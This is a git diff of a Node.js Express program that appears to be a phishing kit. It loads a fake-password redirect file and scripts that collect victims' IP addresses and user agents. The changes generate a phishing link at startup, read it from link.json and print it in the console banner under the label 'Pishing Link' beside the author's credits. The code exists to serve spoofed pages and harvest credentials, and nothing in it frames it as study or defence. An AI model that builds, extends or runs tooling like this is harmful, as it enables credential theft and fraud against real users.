@@ -9,6 +9,7 @@ const readline = require('readline-sync')
 const Table = require('cli-table')
 const Info = []
 const fakepass = require('./redirect.json')
+
 // def
 const app = express()
 me = new Table()
@@ -19,6 +20,8 @@ const getAgent = require('./scripts/getAgent.js')
 const getIp = require('./scripts/getIp.js')
 const getLink = require('./scripts/getLink.js')
 
+
+getLink()
 // colors
 vermelho = '\033[31m'
 verde = '\033[32m'
@@ -51,9 +54,14 @@ app.use(session({
 	resave: true,
 	saveUninitialized: true
 }))
-
 app.use(bodyParser.urlencoded({extended : true}))
 app.use(bodyParser.json())
+
+// read link
+const logLink = require('./link.json')
+Info.link = logLink.link
+
+
 
 // routes
 app.get('/', (req, res) => {
@@ -126,6 +134,7 @@ app.listen(1337, ()=>{
     {"Template":site}
     ,{"Author":"Gab"}
     ,{"Github:":" https://github.com/gabhm"}
+    ,{"Pishing Link":Info.link}
   )
   console.log(me.toString())
 })
